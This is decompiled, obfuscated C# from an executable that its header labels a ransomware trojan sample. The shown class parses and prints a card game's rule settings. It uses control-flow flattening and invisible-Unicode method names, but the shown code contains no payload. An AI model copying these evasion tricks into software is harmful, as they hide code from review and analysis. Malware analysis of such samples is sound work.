// Decompiled with JetBrains decompiler
// Type: Cytotechnologist.Rules
// Assembly: TypeLimitingDeserializationBind, Version=2.0.4.0, Culture=neutral, PublicKeyToken=null
// MVID: 1D6D78DD-B812-498A-928B-6D9E4655E6A7
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.02-msil\HEUR-Trojan-Ransom.MSIL.Blocker.gen-0f32fcee5fe0e98a2f219eac2c9b9c19cbb2f48660a676a0992bf38c59cdf153.exe

using SimpleJSON;
using System;
using System.Collections.Generic;
using System.Globalization;
using System.Runtime.InteropServices;

namespace Cytotechnologist
{
  public class Rules
  {
    public int SprintCount { get; private set; }

    public int MaxImpact { get; private set; }

    public Card[] Cards { get; private set; }

    public int InitialResources { get; private set; }

    public int NormalPlanningCount { get; private set; }

    public int NormalPlanningCost { get; private set; }

    public int OverPlanningCost { get; private set; }

    public int SprintsWonWithoutPlanning { get; private set; }

    public float[] RiskChances { get; private set; }

    public bool EconomicsAffectsAll { get; private set; }

    public int StayOnSprintMinDiff { get; private set; }

    public bool OnlyOneWinner { get; private set; }

    private Rules()
    {
label_1:
      int num1 = 1685828018;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ 1988306866)) % 3U)
        {
          case 0:
            goto label_1;
          case 1:
            goto label_3;
          case 2:
            num1 = (int) num2 * -516276543 ^ 1851290210;
            continue;
          default:
            goto label_5;
        }
      }
label_3:
      return;
label_5:;
    }

    public static Rules Deserialize(JSONNode json)
    {
      int asInt = json["max-impact"].AsInt;
      Rules rules = new Rules()
      {
        SprintCount = json["sprints"].AsInt,
        MaxImpact = asInt,
        Cards = Rules.ParseDeck(json["deck"], asInt),
        InitialResources = json["initial-resources"].AsInt,
        NormalPlanningCount = json["normal-planning-count"].AsInt,
        NormalPlanningCost = json["normal-planning-cost"].AsInt,
        OverPlanningCost = json["over-planning-cost"].AsInt,
        SprintsWonWithoutPlanning = json["sprints-won-without-planning"].AsInt,
        RiskChances = Rules.ParseRiskChances(json["risk-chances"]),
        EconomicsAffectsAll = json["economics-affects-all"].AsBool,
        StayOnSprintMinDiff = json["stay-on-sprint-min-diff"].AsInt,
        OnlyOneWinner = json["only-one-winner"].AsBool
      };
label_1:
      int num1 = 63540271;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ 1901034770)) % 3U)
        {
          case 1:
            num1 = (int) num2 * 1226323380 ^ 1391261420;
            continue;
          case 2:
            goto label_1;
          default:
            goto label_4;
        }
      }
label_4:
      return rules;
    }

    private static float[] ParseRiskChances(JSONNode json)
    {
      float[] numArray = new float[json.Count];
label_1:
      int num1 = -1358551109;
      int aIndex;
      float[] riskChances;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ -1662628358)) % 8U)
        {
          case 0:
            numArray[aIndex] = json[aIndex].AsFloat;
            ++aIndex;
            num1 = -1967684874;
            continue;
          case 1:
            aIndex = 0;
            num1 = (int) num2 * 1550818742 ^ 1013884579;
            continue;
          case 2:
            goto label_1;
          case 3:
            num1 = (int) num2 * -1267363626 ^ -1005990651;
            continue;
          case 4:
            int num3;
            num1 = num3 = aIndex < numArray.Length ? -661603878 : (num3 = -343814324);
            continue;
          case 6:
            riskChances = numArray;
            num1 = (int) num2 * -1181077308 ^ 1015583817;
            continue;
          case 7:
            num1 = (int) num2 * -1422514535 ^ 2023090849;
            continue;
          default:
            goto label_9;
        }
      }
label_9:
      return riskChances;
    }

    private static Card[] ParseDeck(JSONNode json, int maxImpact)
    {
      int count = json.Count;
label_1:
      int num1 = -647704427;
      bool flag1;
      int aIndex1;
      int aIndex2;
      List<Card> cardList;
      bool flag2;
      JSONNode jsonNode;
      int num2;
      Card[] array;
      while (true)
      {
        uint num3;
        switch ((num3 = (uint) (num1 ^ -928724245)) % 22U)
        {
          case 0:
            flag2 = aIndex1 < maxImpact * 2;
            num1 = -1332930632;
            continue;
          case 1:
            num1 = -1370169625;
            continue;
          case 2:
            array = cardList.ToArray();
            num1 = (int) num3 * 915988007 ^ 869614470;
            continue;
          case 4:
            cardList = new List<Card>();
            num1 = (int) num3 * 92007160 ^ 1379001984;
            continue;
          case 5:
            ++aIndex1;
            num1 = (int) num3 * 718887684 ^ -131705717;
            continue;
          case 6:
            ++aIndex2;
            num1 = (int) num3 * 409445365 ^ 2042597841;
            continue;
          case 7:
            aIndex2 = 0;
            num1 = (int) num3 * 2104339801 ^ -1940000646;
            continue;
          case 8:
            num2 = 0;
            num1 = -245534805;
            continue;
          case 9:
            ++num2;
            num1 = (int) num3 * 1440020568 ^ -26520573;
            continue;
          case 10:
            int num4;
            num1 = num4 = aIndex2 < count ? -1823098094 : (num4 = -1772401229);
            continue;
          case 11:
            num1 = -1628211903;
            continue;
          case 12:
            flag1 = num2 < jsonNode[aIndex1].AsInt;
            num1 = -295847208;
            continue;
          case 13:
            int num5 = flag1 ? -1894103753 : (num5 = -959560969);
            num1 = num5 ^ (int) num3 * 1441520055;
            continue;
          case 14:
            bool flag3 = aIndex1 < maxImpact;
            cardList.Add(new Card()
            {
              Impact = flag3 ? -(maxImpact - aIndex1) : maxImpact * 2 - aIndex1,
              Type = aIndex2
            });
            num1 = -790023126;
            continue;
          case 15:
            goto label_1;
          case 16:
            num1 = (int) num3 * 790313037 ^ -222271413;
            continue;
          case 17:
            num1 = (int) num3 * -522890936 ^ -1938261545;
            continue;
          case 18:
            num1 = (int) num3 * 2066119609 ^ -705320967;
            continue;
          case 19:
            num1 = (int) num3 * -747351277 ^ 1099273755;
            continue;
          case 20:
            jsonNode = json[aIndex2];
            aIndex1 = 0;
            num1 = (int) num3 * -1090590419 ^ -1785953362;
            continue;
          case 21:
            int num6 = flag2 ? 1744493582 : (num6 = 1739598248);
            num1 = num6 ^ (int) num3 * -1181473253;
            continue;
          default:
            goto label_23;
        }
      }
label_23:
      return array;
    }

    public override string ToString()
    {
label_1:
      int num1 = 1851054798;
      string str;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ 585802808)) % 3U)
        {
          case 0:
            goto label_1;
          case 2:
            str = Rules.\u200E‌‏‬⁮⁪‪‬‍‮⁭⁪‭⁫⁪​‫‮‭⁪‮⁫‍⁭‬‬‮‬‪⁭‮⁮⁯‪⁪‎⁬‎‌‍‮("sprints: {0},\nmax-impact:{1},\ndeck: \n{2},\n\ninitial-resources: {3},\n\nnormal-planning-count: {4},\nnormal-planning-cost: {5},\nover-planning-cost: {6},\nsprints-won-without-planning: {7},\n\nrisk-chances: {8},\n\neconomics-affects-all: {9},\nstay-on-sprint-min-diff: {10},\nonly-one-winner: {11}", new object[12]
            {
              (object) this.SprintCount,
              (object) this.MaxImpact,
              (object) this.CardsToString(),
              (object) this.InitialResources,
              (object) this.NormalPlanningCount,
              (object) this.NormalPlanningCost,
              (object) this.OverPlanningCost,
              (object) this.SprintsWonWithoutPlanning,
              (object) this.RiskChancesToString(),
              (object) this.EconomicsAffectsAll,
              (object) this.StayOnSprintMinDiff,
              (object) this.OnlyOneWinner
            });
            num1 = (int) num2 * 1410808036 ^ 1741750585;
            continue;
          default:
            goto label_4;
        }
      }
label_4:
      return str;
    }

    private string CardsToString()
    {
      string str1 = "[\n\t";
label_1:
      int num1 = -1157447455;
      bool flag;
      int index;
      Card[] cards;
      string str2;
      Card card1;
      int num2;
      while (true)
      {
        uint num3;
        switch ((num3 = (uint) (num1 ^ -757337318)) % 17U)
        {
          case 0:
            int num4;
            num1 = num4 = index < cards.Length ? -1128379904 : (num4 = -1988977374);
            continue;
          case 1:
            str2 = Rules.\u206F‮‌‪‭⁫‌⁮‬⁪‫‬⁬‎‪⁭‬‍‫​⁬⁬⁯​‎‌‏‪⁮‮​​‌‍⁯⁭⁬‪⁭‏‮(str1, "\n]");
            num1 = (int) num3 * 1934708034 ^ 795177192;
            continue;
          case 2:
            string str3 = str1;
            Card card2 = card1;
            string str4 = card2 != null ? Rules.\u200B‬‎‌‪⁫‌‌⁭⁯⁬⁭‫‭⁫‬‬‬‪‏⁯‍‬​‬‎⁫‪‍‌⁯⁫‏⁬‪⁮‏‬‮‏‮((object) card2) : (string) null;
            str1 = Rules.\u202E‫‪‬‬⁭⁯​‪‭‮‫‭⁫‮‬⁫‮‭⁫⁫‪‭‎‮‏‪‫‫‪‌⁪⁭⁪⁫‍⁮‏‎‌‮(str3, str4, " ");
            num1 = -257964737;
            continue;
          case 3:
            int num5 = !flag ? -1817700011 : (num5 = -743029384);
            num1 = num5 ^ (int) num3 * 1758607224;
            continue;
          case 4:
            ++index;
            num1 = (int) num3 * 1131836503 ^ -2081270708;
            continue;
          case 5:
            cards = this.Cards;
            num1 = (int) num3 * 1047812343 ^ -1174899265;
            continue;
          case 6:
            num1 = (int) num3 * -2127689766 ^ -1173315402;
            continue;
          case 7:
            num1 = (int) num3 * 452323935 ^ 1889208739;
            continue;
          case 8:
            goto label_1;
          case 9:
            num2 = card1.Type;
            num1 = (int) num3 * -1327860416 ^ 155029448;
            continue;
          case 10:
            num1 = (int) num3 * 1506684491 ^ -835546877;
            continue;
          case 11:
            str1 = Rules.\u206F‮‌‪‭⁫‌⁮‬⁪‫‬⁬‎‪⁭‬‍‫​⁬⁬⁯​‎‌‏‪⁮‮​​‌‍⁯⁭⁬‪⁭‏‮(str1, "\n\t");
            num1 = (int) num3 * -1748374103 ^ -414955248;
            continue;
          case 12:
            num2 = 0;
            num1 = (int) num3 * -1539046904 ^ 730615781;
            continue;
          case 14:
            card1 = cards[index];
            num1 = -1404413487;
            continue;
          case 15:
            flag = num2 != card1.Type;
            num1 = (int) num3 * -1431165353 ^ -310406038;
            continue;
          case 16:
            index = 0;
            num1 = (int) num3 * -1337057630 ^ -1806535460;
            continue;
          default:
            goto label_18;
        }
      }
label_18:
      return str2;
    }

    private string RiskChancesToString()
    {
label_1:
      int num1 = -21660275;
      string str1;
      string str2;
      int index;
      bool flag;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ -1870869634)) % 9U)
        {
          case 1:
            int num3 = !flag ? -1443114046 : (num3 = -1170469381);
            num1 = num3 ^ (int) num2 * 240781205;
            continue;
          case 2:
            goto label_1;
          case 3:
            str1 = Rules.\u202E‫‪‬‬⁭⁯​‪‭‮‫‭⁫‮‬⁫‮‭⁫⁫‪‭‎‮‏‪‫‫‪‌⁪⁭⁪⁫‍⁮‏‎‌‮(str1, ", ", this.RiskChances[index].ToString((IFormatProvider) Rules.\u202E‏‌⁮‌⁪‭⁮‫⁬‪⁪‬‌​⁬‪‌⁮⁭‫‭‪‭⁯⁯‍⁯⁬‫‮⁫⁮‬‫​‮‭⁫‎‮()));
            ++index;
            num1 = -584762816;
            continue;
          case 4:
            str1 = Rules.\u206F‮‌‪‭⁫‌⁮‬⁪‫‬⁬‎‪⁭‬‍‫​⁬⁬⁯​‎‌‏‪⁮‮​​‌‍⁯⁭⁬‪⁭‏‮("[ ", this.RiskChances[0].ToString((IFormatProvider) Rules.\u202E‏‌⁮‌⁪‭⁮‫⁬‪⁪‬‌​⁬‪‌⁮⁭‫‭‪‭⁯⁯‍⁯⁬‫‮⁫⁮‬‫​‮‭⁫‎‮()));
            num1 = (int) num2 * -253405049 ^ -2117293597;
            continue;
          case 5:
            str2 = Rules.\u206F‮‌‪‭⁫‌⁮‬⁪‫‬⁬‎‪⁭‬‍‫​⁬⁬⁯​‎‌‏‪⁮‮​​‌‍⁯⁭⁬‪⁭‏‮(str1, " ]");
            num1 = (int) num2 * 333716398 ^ 1426488041;
            continue;
          case 6:
            num1 = (int) num2 * -551927454 ^ -426113666;
            continue;
          case 7:
            flag = index < this.RiskChances.Length;
            num1 = -2137744375;
            continue;
          case 8:
            index = 1;
            num1 = (int) num2 * 1804173749 ^ -993359831;
            continue;
          default:
            goto label_10;
        }
      }
label_10:
      return str2;
    }

    static string \u200E‌‏‬⁮⁪‪‬‍‮⁭⁪‭⁫⁪​‫‮‭⁪‮⁫‍⁭‬‬‮‬‪⁭‮⁮⁯‪⁪‎⁬‎‌‍‮([In] string obj0, [In] object[] obj1) => string.Format(obj0, obj1);

    static string \u206F‮‌‪‭⁫‌⁮‬⁪‫‬⁬‎‪⁭‬‍‫​⁬⁬⁯​‎‌‏‪⁮‮​​‌‍⁯⁭⁬‪⁭‏‮([In] string obj0, [In] string obj1) => obj0 + obj1;

    static string \u200B‬‎‌‪⁫‌‌⁭⁯⁬⁭‫‭⁫‬‬‬‪‏⁯‍‬​‬‎⁫‪‍‌⁯⁫‏⁬‪⁮‏‬‮‏‮([In] object obj0) => obj0.ToString();

    static string \u202E‫‪‬‬⁭⁯​‪‭‮‫‭⁫‮‬⁫‮‭⁫⁫‪‭‎‮‏‪‫‫‪‌⁪⁭⁪⁫‍⁮‏‎‌‮(
      [In] string obj0,
      [In] string obj1,
      [In] string obj2)
    {
      return obj0 + obj1 + obj2;
    }

    static CultureInfo \u202E‏‌⁮‌⁪‭⁮‫⁬‪⁪‬‌​⁬‪‌⁮⁭‫‭‪‭⁯⁯‍⁯⁬‫‮⁫⁮‬‫​‮‭⁫‎‮() => CultureInfo.InvariantCulture;
  }
}
